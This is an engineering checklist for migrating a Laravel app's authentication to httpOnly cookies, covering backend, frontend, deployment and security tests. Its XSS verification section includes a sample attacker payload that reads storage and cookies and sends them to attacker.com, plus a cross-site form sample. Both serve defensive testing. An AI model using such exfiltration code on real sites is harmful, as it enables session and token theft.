# httpOnly Cookie Migration - Implementation Checklist

## Status: Phase 2 Backend Implementation ✅ COMPLETE

---

## Phase 2: Backend Implementation (✅ COMPLETE)

### Database
- [x] Migration created: `2025_11_21_150000_add_token_security_columns.php`
  - [x] token_identifier (UUID) - stored in cookie
  - [x] token_hash (SHA256) - for DB lookup
  - [x] device_fingerprint - optional device binding
  - [x] last_rotated_at - track token rotation

### Controllers
- [x] HttpOnlyTokenController created
  - [x] login() - create token, set httpOnly cookie, return CSRF token
  - [x] refresh() - rotate token, revoke old, set new cookie
  - [x] logout() - revoke token, clear cookie
  - [x] me() - return user + token metadata

### Middleware
- [x] CheckHttpOnlyTokenValid created
  - [x] Extract token from httpOnly cookie
  - [x] Hash lookup in database
  - [x] Validate expiration
  - [x] Validate revocation
  - [x] Validate refresh count (suspicious activity)
  - [x] Validate device fingerprint (optional)

### Routes
- [x] Added to `routes/api.php`
  - [x] POST /api/auth/login-httponly
  - [x] GET /api/auth/csrf-token
  - [x] POST /api/auth/refresh-httponly (protected)
  - [x] POST /api/auth/logout-httponly (protected)
  - [x] GET /api/auth/me-httponly (protected)

### Configuration
- [x] Updated `config/sanctum.php`
  - [x] Added cookie_name
  - [x] Added cookie_secure
  - [x] Added cookie_http_only
  - [x] Added cookie_same_site
  - [x] Added verify_device_fingerprint

- [x] Updated `config/session.php`
  - [x] http_only = true
  - [x] same_site = 'strict'
  - [x] secure = env()

- [x] Updated `.env`
  - [x] SANCTUM_SHORT_LIVED_EXPIRATION_MINUTES=60
  - [x] SANCTUM_LONG_LIVED_EXPIRATION_DAYS=30
  - [x] SANCTUM_MAX_REFRESH_COUNT_PER_HOUR=10
  - [x] SANCTUM_COOKIE_NAME=soleil_token
  - [x] SESSION_HTTP_ONLY=true
  - [x] SESSION_SAME_SITE=strict

### Middleware Registration
- [x] Updated `bootstrap/app.php`
  - [x] Registered CheckHttpOnlyTokenValid alias

### Testing
- [x] Created `tests/Feature/HttpOnlyCookieAuthenticationTest.php`
  - [x] Test 1: Login sets httpOnly cookie (no plaintext token)
  - [x] Test 2: Token stored with UUID identifier + hash
  - [x] Test 3: Refresh rotates token (old revoked)
  - [x] Test 4: Logout revokes + clears cookie
  - [x] Test 5: Revoked token returns 401 TOKEN_REVOKED
  - [x] Test 6: Expired token returns 401 TOKEN_EXPIRED
  - [x] Test 7: Missing cookie returns 401
  - [x] Test 8: Invalid identifier returns 401
  - [x] Test 9: CSRF token endpoint accessible publicly
  - [x] Test 10: Me endpoint returns user + token info
  - [x] Test 11: Excessive refresh triggers SUSPICIOUS_ACTIVITY

### Documentation
- [x] Created HTTPONLY_COOKIE_IMPLEMENTATION.md (frontend guide)
- [x] Created HTTPONLY_COOKIE_COMPLETE.md (implementation summary)
- [x] Created HTTPONLY_COOKIE_QUICKSTART.md (quick start guide)

---

## Phase 3: Frontend Implementation (⏳ TO DO)

### Axios Configuration
- [ ] Update `api.ts` or `api.client.ts`
  - [ ] Set `withCredentials: true`
  - [ ] Add request interceptor for X-XSRF-TOKEN header
  - [ ] Add response interceptor for 401 auto-refresh

### Authentication Hook
- [ ] Update `useAuth` or `useAuthContext`
  - [ ] login() method calls /api/auth/login-httponly
  - [ ] Saves csrf_token to sessionStorage (NOT localStorage)
  - [ ] logout() calls /api/auth/logout-httponly
  - [ ] me() validates token from cookie

### Login Form Component
- [ ] Update LoginForm component
  - [ ] Call useAuth.login() with httpOnly endpoint
  - [ ] Display loading/error states
  - [ ] Redirect on success

### Protected Routes
- [ ] Update ProtectedRoute/PrivateRoute component
  - [ ] Validate token on mount (call me())
  - [ ] Handle 401 redirect
  - [ ] Show loading state during validation

### Remove localStorage Code
- [ ] Search for `localStorage.setItem('token')`
  - [ ] DELETE all instances
- [ ] Search for `localStorage.getItem('token')`
  - [ ] DELETE all instances
- [ ] Search for Bearer token in Authorization header
  - [ ] DELETE all instances
- [ ] Search for `Authorization: Bearer`
  - [ ] DELETE all instances

### CSRF Token Management
- [ ] Create utility function getCsrfToken()
  - [ ] Read from sessionStorage
  - [ ] Return null if not set
- [ ] Create utility function setCsrfToken()
  - [ ] Save to sessionStorage
- [ ] Create utility function clearCsrfToken()
  - [ ] Remove from sessionStorage

### Testing
- [ ] Update API tests
  - [ ] Mock withCredentials: true
  - [ ] Verify X-XSRF-TOKEN header added
- [ ] Update auth tests
  - [ ] No localStorage token checks
  - [ ] sessionStorage csrf_token checks
  - [ ] httpOnly cookie behavior
- [ ] Manual browser testing
  - [ ] DevTools: Cookies tab shows soleil_token (HttpOnly)
  - [ ] DevTools: Storage tab shows NO token in localStorage
  - [ ] Network tab shows Cookie + X-XSRF-TOKEN headers

---

## Phase 4: Migration & Deployment (⏳ TO DO)

### Pre-Deployment
- [ ] Run backend tests
  ```bash
  php artisan test tests/Feature/HttpOnlyCookieAuthenticationTest.php
  ```

- [ ] Run frontend tests
  ```bash
  npm test
  ```

- [ ] Manual testing in development
  - [ ] Login → Check DevTools cookies
  - [ ] Protected endpoints → Verify cookie sent
  - [ ] Logout → Verify cookie cleared
  - [ ] Refresh test → Manual 401 simulation
  - [ ] XSS test → Verify token not in localStorage

### Database Migration
- [ ] Run migration (staging):
  ```bash
  php artisan migrate
  ```

- [ ] Verify columns created:
  ```sql
  SELECT * FROM personal_access_tokens LIMIT 1;
  ```

### Deployment Strategy
- [ ] Deploy backend changes first
  - [ ] New HttpOnlyTokenController
  - [ ] New CheckHttpOnlyTokenValid middleware
  - [ ] Updated routes
  - [ ] Updated config files
  - [ ] Run migration

- [ ] Keep old Bearer token endpoints active (backward compatibility)
  - [ ] /api/auth/login (old)
  - [ ] /api/auth/login-v2 (token expiration)
  - [ ] /api/auth/login-httponly (new - httpOnly cookie)

- [ ] Update frontend
  - [ ] Update api.ts (withCredentials, interceptors)
  - [ ] Update useAuth hook
  - [ ] Update LoginForm component
  - [ ] Remove localStorage code
  - [ ] Deploy frontend

- [ ] Monitor after deployment
  - [ ] Check logs for 401 errors
  - [ ] Verify refresh endpoint hit rate
  - [ ] Monitor CSRF token issues (419 errors)
  - [ ] Check cookie acceptance rate

### Post-Deployment
- [ ] Verify both auth flows work
  - [ ] Old Bearer token endpoints (legacy support)
  - [ ] New httpOnly cookie endpoints (current)

- [ ] Plan deprecation of old endpoints
  - [ ] Set deprecation timeline (30-60 days)
  - [ ] Notify frontend teams
  - [ ] Remove old endpoints after migration complete

---

## Phase 5: Security Verification (⏳ TO DO)

### Browser DevTools Verification
- [ ] **Cookies Tab**
  - [ ] soleil_token exists after login
  - [ ] HttpOnly flag: YES
  - [ ] Secure flag: YES (production)
  - [ ] SameSite: Strict
  - [ ] Domain: correct domain

- [ ] **Storage Tab → Local Storage**
  - [ ] NO 'token' key
  - [ ] NO 'access_token' key
  - [ ] NO 'bearer_token' key

- [ ] **Storage Tab → Session Storage**
  - [ ] csrf_token key exists after login
  - [ ] csrf_token empty after logout
  - [ ] csrf_token cleared on page close (session)

- [ ] **Network Tab**
  - [ ] POST /api/auth/login-httponly
    - Response has Set-Cookie header
    - Response does NOT have plaintext token
    - Response has csrf_token

  - [ ] POST /api/bookings
    - Request has Cookie header: soleil_token=...
    - Request has X-XSRF-TOKEN header
    - No Authorization: Bearer header

### XSS Security Tests

**Test 1: localStorage Inaccessible**
```javascript
// In browser console after login:
localStorage.getItem('token')     // Should be null
localStorage.getItem('access_token')  // Should be null
```

**Test 2: httpOnly Cookie Inaccessible**
```javascript
// In browser console:
document.cookie  // Should NOT include soleil_token
// Result: "csrf_token=xyz..." (only sessionStorage, no httpOnly)
```

**Test 3: CSRF Token Accessible (for X-XSRF-TOKEN)**
```javascript
sessionStorage.getItem('csrf_token')  // Should have value
```

**Test 4: Simulate XSS Attack**
```javascript
// This would be the attacker's payload:
const stolen = localStorage.getItem('token');  // null (safe!)
const stolen2 = document.cookie;  // No httpOnly cookie (safe!)

// Attacker cannot steal token, attack fails
fetch('https://attacker.com?token=' + stolen)  // sends ?token=null
```

### CSRF Protection Tests

**Test 1: Missing X-XSRF-TOKEN Header**
```bash
curl -X POST http://localhost:8000/api/bookings \
  -H "Cookie: soleil_token=..." \
  -H "Content-Type: application/json" \
  -d '{...}'

# Should return 419 TokenMismatchException (CSRF failed)
```

**Test 2: With X-XSRF-TOKEN Header**
```bash
curl -X POST http://localhost:8000/api/bookings \
  -H "Cookie: soleil_token=..." \
  -H "X-XSRF-TOKEN: abc123..." \
  -H "Content-Type: application/json" \
  -d '{...}'

# Should return 200 (success)
```

**Test 3: Cross-Site Request (SameSite Protection)**
```html
<!-- From attacker.com, trying to hit soleilhostel.com -->
<form action="http://soleilhostel.com/api/bookings" method="POST">
  <input type="hidden" name="room_id" value="1">
</form>

<!-- Browser WILL NOT send soleil_token cookie (SameSite=Strict) -->
<!-- Request fails with 401 Unauthorized -->
```

### Token Expiration Tests

**Test 1: Expired Token**
- Login and get token
- Manually set token expires_at to past date
- Access protected endpoint
- Should return 401 with code: TOKEN_EXPIRED

**Test 2: Revoked Token**
- Login and get token
- Logout (revokes token)
- Try to access protected endpoint with old token
- Should return 401 with code: TOKEN_REVOKED

**Test 3: Refresh Rotation**
- Login: get token_identifier_1
- Refresh: should get token_identifier_2
- token_identifier_1 should be revoked
- Old token_identifier_1 should be rejected

**Test 4: Suspicious Activity Detection**
- Login: get token
- Call refresh 11 times (> max_refresh_count = 10)
- 11th refresh should return 401 with code: SUSPICIOUS_ACTIVITY
- Token should be revoked

---

## Success Criteria

### Backend (✅ COMPLETE)
- [x] httpOnly cookie authentication working
- [x] Token expiration enforced
- [x] Token rotation on refresh
- [x] Device fingerprint validation (optional)
- [x] All 11 feature tests passing
- [x] No plaintext tokens in responses

### Frontend (⏳ IN PROGRESS)
- [ ] No localStorage token storage
- [ ] httpOnly cookie auto-sent by browser
- [ ] CSRF token in sessionStorage
- [ ] X-XSRF-TOKEN header added to requests
- [ ] 401 triggers automatic refresh + retry
- [ ] Logout clears all state
- [ ] Protected routes redirect on 401

### Security (⏳ IN PROGRESS)
- [ ] XSS cannot access token
- [ ] CSRF attacks blocked (SameSite=Strict)
- [ ] Man-in-the-middle mitigated (Secure flag + HTTPS)
- [ ] Token theft mitigated (refresh rotation)
- [ ] Suspicious activity detected (refresh count)
- [ ] Device theft mitigated (device fingerprint - optional)

### Operations (⏳ TO DO)
- [ ] Deployment successful
- [ ] Both old and new endpoints working
- [ ] Monitoring in place
- [ ] Logs showing successful refresh
- [ ] No 419 CSRF errors in production
- [ ] No token theft incidents

---

## Quick Reference: Commands

### Backend Testing
```bash
# Run httpOnly cookie tests
php artisan test tests/Feature/HttpOnlyCookieAuthenticationTest.php

# Run all tests
php artisan test

# Run migration
php artisan migrate

# Tinker (interactive PHP shell)
php artisan tinker
```

### Frontend Testing
```bash
# Install dependencies
npm install

# Run tests
npm test

# Run in watch mode
npm test -- --watch

# Build
npm run build

# Start dev server
npm run dev
```

### Manual cURL Testing
```bash
# 1. Login
curl -X POST http://localhost:8000/api/auth/login-httponly \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password123"}' \
  -v

# 2. Extract soleil_token from Set-Cookie header, then:
# 3. Refresh (with token in cookie)
curl -X POST http://localhost:8000/api/auth/refresh-httponly \
  -b "soleil_token=<UUID_FROM_ABOVE>" \
  -v

# 4. Get me
curl -X GET http://localhost:8000/api/auth/me-httponly \
  -b "soleil_token=<UUID>" \
  -v

# 5. Logout
curl -X POST http://localhost:8000/api/auth/logout-httponly \
  -b "soleil_token=<UUID>" \
  -v
```

---

## Timeline Estimate

- Phase 2 Backend: ✅ **2 hours** (COMPLETE)
- Phase 3 Frontend: ⏳ **3 hours**
- Phase 4 Deployment: ⏳ **1 hour**
- Phase 5 Verification: ⏳ **1 hour**

**Total**: ~7 hours

---

## Contacts & Documentation

- Backend: [HTTPONLY_COOKIE_COMPLETE.md](./HTTPONLY_COOKIE_COMPLETE.md)
- Frontend: [HTTPONLY_COOKIE_IMPLEMENTATION.md](./HTTPONLY_COOKIE_IMPLEMENTATION.md)
- Quick Start: [HTTPONLY_COOKIE_QUICKSTART.md](./HTTPONLY_COOKIE_QUICKSTART.md)
- Token Expiration: [TOKEN_EXPIRATION_IMPLEMENTATION.md](./TOKEN_EXPIRATION_IMPLEMENTATION.md)

---

## Notes

- Session storage cookie name: `SANCTUM_COOKIE_NAME` (env var)
- CSRF token validation: `X-XSRF-TOKEN` header (Laravel built-in)
- Device fingerprint: Optional, disable in dev, enable in production
- Refresh rotation: Automatic, old token revoked, new token in cookie
- Refresh retry: Automatic via Axios interceptor on 401
- Single device login: Optional, can log out other devices

---

**Last Updated**: 2025-11-21
**Status**: Phase 2 Backend Complete, Phases 3-5 Pending
